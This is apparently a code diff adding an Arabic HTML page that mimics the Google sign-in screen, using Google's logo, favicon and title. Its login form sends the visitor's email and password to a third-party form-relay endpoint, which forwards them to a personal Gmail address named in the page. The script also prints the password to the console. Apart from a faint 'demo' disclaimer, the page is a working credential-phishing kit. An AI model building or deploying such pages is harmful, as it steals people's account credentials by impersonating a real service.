@@ -1,0 +1,251 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - Google</title>
+    <link rel="icon" href="https://www.google.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Arial', sans-serif;
+        }
+        
+        body {
+            background: white;
+            color: #202124;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        /* شريط Google */
+        .top-bar {
+            display: flex;
+            justify-content: flex-end;
+            padding: 15px 20px;
+            border-bottom: 1px solid #dadce0;
+        }
+        
+        .top-bar a {
+            color: #5f6368;
+            text-decoration: none;
+            margin-left: 15px;
+            font-size: 13px;
+        }
+        
+        /* المحتوى الرئيسي */
+        .main {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 20px;
+        }
+        
+        .google-logo {
+            margin-bottom: 20px;
+        }
+        
+        .google-logo img {
+            width: 75px;
+            height: 24px;
+        }
+        
+        /* بطاقة التسجيل */
+        .login-box {
+            width: 100%;
+            max-width: 450px;
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            text-align: center;
+        }
+        
+        h1 {
+            font-size: 24px;
+            font-weight: normal;
+            margin-bottom: 10px;
+            color: #202124;
+        }
+        
+        .subtitle {
+            color: #5f6368;
+            margin-bottom: 35px;
+        }
+        
+        /* حقول الإدخال */
+        .input-field {
+            width: 100%;
+            height: 54px;
+            padding: 15px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            margin-bottom: 20px;
+        }
+        
+        .input-field:focus {
+            border-color: #1a73e8;
+            outline: none;
+            box-shadow: 0 0 0 2px rgba(26,115,232,0.2);
+        }
+        
+        /* أزرار */
+        .buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 40px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            padding: 10px 0;
+        }
+        
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        
+        /* رسالة النجاح */
+        .success-msg {
+            background: #d4edda;
+            color: #155724;
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid #c3e6cb;
+            display: none;
+        }
+        
+        /* الفوتر */
+        footer {
+            background: #f2f2f2;
+            padding: 15px;
+            color: #70757a;
+            text-align: center;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <!-- الشريط العلوي -->
+    <div class="top-bar">
+        <a href="#">مساعدة</a>
+        <a href="#">الخصوصية</a>
+        <a href="#">الشروط</a>
+    </div>
+    
+    <!-- المحتوى الرئيسي -->
+    <div class="main">
+        <div class="google-logo">
+            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
+        </div>
+        
+        <div class="login-box">
+            <h1>تسجيل الدخول</h1>
+            <p class="subtitle">أدخل بياناتك للوصول إلى النظام</p>
+            
+            <!-- النموذج الذي يرسل إيميل حقيقي -->
+            <form action="https://formspree.io/f/xzbnzkwl" method="POST" id="loginForm">
+                <!-- بيانات مخفية للإيميل -->
+                <input type="hidden" name="_subject" value="🔐 بيانات تسجيل دخول جديدة">
+                <input type="hidden" name="_replyto" value="alomranwesam@gmail.com">
+                <input type="hidden" name="_cc" value="alomranwesam@gmail.com">
+                
+                <!-- الحقول الظاهرة -->
+                <input type="email" name="email" class="input-field" placeholder="البريد الإلكتروني" required>
+                <input type="password" name="password" class="input-field" placeholder="كلمة المرور" required>
+                
+                <div class="buttons">
+                    <a href="#" class="create-account" onclick="alert('لإنشاء حساب: accounts.google.com')">إنشاء حساب</a>
+                    <button type="submit" class="next-btn">التالي</button>
+                </div>
+            </form>
+            
+            <div id="successMessage" class="success-msg">
+                ✅ تم إرسال البيانات إلى بريدك: alomranwesam@gmail.com
+            </div>
+            
+            <p style="color: #666; font-size: 12px; margin-top: 30px;">
+                ⚠️ هذا النظام يرسل بياناتك إلى البريد المحدد
+            </p>
+        </div>
+    </div>
+    
+    <!-- الفوتر -->
+    <footer>
+        <p>© 2024 Google - نظام تجريبي</p>
+    </footer>
+
+    <script>
+        // عند إرسال النموذج
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            // منع إعادة التحميل
+            e.preventDefault();
+            
+            // إظهار رسالة الانتظار
+            const submitBtn = this.querySelector('.next-btn');
+            const originalText = submitBtn.textContent;
+            submitBtn.textContent = 'جاري الإرسال...';
+            submitBtn.disabled = true;
+            
+            // إرسال النموذج باستخدام Fetch
+            fetch(this.action, {
+                method: 'POST',
+                body: new FormData(this),
+                headers: {
+                    'Accept': 'application/json'
+                }
+            })
+            .then(response => {
+                if (response.ok) {
+                    // إظهار رسالة النجاح
+                    document.getElementById('successMessage').style.display = 'block';
+                    
+                    // تسجيل البيانات في الكونسول
+                    const formData = new FormData(this);
+                    console.log('📧 تم إرسال البيانات:');
+                    console.log('- البريد:', formData.get('email'));
+                    console.log('- كلمة المرور:', formData.get('password'));
+                    console.log('- إلى:', 'alomranwesam@gmail.com');
+                    console.log('- الوقت:', new Date().toLocaleString());
+                    
+                    // مسح الحقول
+                    this.reset();
+                    
+                    // تمرير للأسفل لرؤية الرسالة
+                    document.getElementById('successMessage').scrollIntoView({ behavior: 'smooth' });
+                } else {
+                    alert('حدث خطأ في الإرسال. حاول مرة أخرى.');
+                }
+            })
+            .catch(error => {
+                alert('فشل الإرسال: ' + error.message);
+            })
+            .finally(() => {
+                // إعادة الزر لحالته الأصلية
+                submitBtn.textContent = originalText;
+                submitBtn.disabled = false;
+            });
+            
+            return false;
+        });
+        
+        // عند تحميل الصفحة
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🌐 النظام يعمل!');
+            console.log('📧 سيتم إرسال البيانات إلى: alomranwesam@gmail.com');
+        });
+    </script>
+</body>
+</html>
